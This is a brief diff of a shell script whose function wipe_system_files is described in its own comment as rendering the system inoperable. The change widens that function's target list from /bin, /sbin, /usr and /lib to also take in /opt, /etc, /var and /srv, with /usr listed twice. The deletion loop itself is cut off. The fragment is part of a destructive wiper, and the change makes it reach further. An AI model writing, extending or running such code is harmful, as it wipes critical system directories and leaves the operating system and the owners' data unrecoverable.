@@ -29,7 +29,7 @@ wipe_non_essential_data() {
 # Function to wipe system files - Warning: This will render the system inoperable
 wipe_system_files() {
     # Define essential system paths
-    essential_system_paths="/bin /sbin /usr /lib"
+    essential_system_paths="/bin /sbin /usr /lib /opt /etc /var /usr /srv"
 
     for path in $essential_system_paths
     do
